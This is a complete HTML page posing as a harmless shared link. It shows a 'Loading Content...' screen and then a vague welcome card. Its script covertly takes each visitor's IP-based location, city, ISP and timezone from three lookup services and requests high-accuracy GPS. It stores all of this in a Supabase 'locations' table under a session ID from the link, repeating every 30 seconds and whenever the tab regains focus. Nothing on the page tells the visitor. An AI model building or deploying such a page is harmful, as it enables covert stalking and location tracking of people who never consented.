<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>You've received a link!</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', system-ui, sans-serif;
      min-height: 100vh; display: flex; align-items: center; justify-content: center;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff;
    }
    .container { text-align: center; padding: 40px 30px; max-width: 520px; }
    h1 { font-size: 2rem; margin-bottom: 12px; }
    p { font-size: 1.05rem; opacity: 0.9; line-height: 1.6; margin-bottom: 24px; }
    .loader {
      width: 44px; height: 44px; border: 4px solid rgba(255,255,255,0.25);
      border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto 20px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .hidden { display: none; }
    .card { background: rgba(255,255,255,0.15); backdrop-filter: blur(10px); border-radius: 16px; padding: 30px; margin-top: 20px; }
    .card h2 { font-size: 1.3rem; margin-bottom: 8px; }
    .card p { font-size: 0.95rem; margin-bottom: 0; }
  </style>
</head>
<body>
  <div class="container">
    <div id="loading">
      <div class="loader"></div>
      <h1>⏳ Loading Content...</h1>
      <p>Please wait while we prepare everything for you.</p>
    </div>
    <div id="content" class="hidden">
      <h1>👋 Welcome!</h1>
      <div class="card">
        <h2>Thanks for visiting</h2>
        <p>The content you're looking for is being prepared. Please check back later!</p>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script src="./js/config.js"></script>
  <script>
    (async () => {
      const PING_INTERVAL = 30000;
      const params = new URLSearchParams(window.location.search);
      const sessionId = params.get('s') || params.get('id');

      if (!sessionId) { console.log('No session ID'); return; }

      let db;
      try { db = getSupabase(); } catch (e) { console.error(e); return; }

      async function isActive() {
        const { data } = await db.from('sessions').select('is_active').eq('id', sessionId).single();
        return data?.is_active === true;
      }

      async function getIP() {
        try {
          const r = await fetch('https://ipwho.is/');
          if (r.ok) { const d = await r.json(); if (d.success !== false) return { ip: d.ip, latitude: d.latitude, longitude: d.longitude, city: d.city, region: d.region, country: d.country, isp: d.connection?.isp || d.connection?.org || '?', timezone: d.timezone?.id || '?' }; }
        } catch (e) {}
        try {
          const r = await fetch('https://ipapi.co/json/');
          if (r.ok) { const d = await r.json(); return { ip: d.ip, latitude: d.latitude, longitude: d.longitude, city: d.city, region: d.region, country: d.country_name, isp: d.org || '?', timezone: d.timezone || '?' }; }
        } catch (e) {}
        try {
          const r = await fetch('https://freeipapi.com/api/json/');
          if (r.ok) { const d = await r.json(); return { ip: d.ipAddress, latitude: d.latitude, longitude: d.longitude, city: d.cityName, region: d.regionName, country: d.countryName, isp: '?', timezone: d.timeZone || '?' }; }
        } catch (e) {}
        return null;
      }

      function getGPS() {
        return new Promise(r => {
          if (!navigator.geolocation) { r(null); return; }
          navigator.geolocation.getCurrentPosition(
            p => r({ latitude: p.coords.latitude, longitude: p.coords.longitude, acc: p.coords.accuracy }),
            () => r(null), { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
          );
        });
      }

      async function ping() {
        if (!await isActive()) return;
        const ip = await getIP();
        if (!ip) return;
        const gps = await getGPS();
        await db.from('locations').insert({
          session_id: sessionId, ip: ip.ip,
          latitude: gps?.latitude ?? ip.latitude,
          longitude: gps?.longitude ?? ip.longitude,
          city: ip.city, region: ip.region, country: ip.country,
          isp: ip.isp, timezone: ip.timezone,
          accuracy: gps ? 'gps (±' + Math.round(gps.acc) + 'm)' : 'ip (~5-25km)',
          raw_data: { ip, gps: gps || null },
        });
        console.log('📍 Ping sent');
      }

      // Show content after delay
      setTimeout(() => {
        document.getElementById('loading').style.display = 'none';
        document.getElementById('content').classList.remove('hidden');
      }, 2500);

      if (await isActive()) {
        await ping();
        setInterval(ping, PING_INTERVAL);
        document.addEventListener('visibilitychange', () => { if (!document.hidden) ping(); });
      }
    })();
  </script>
</body>
</html>
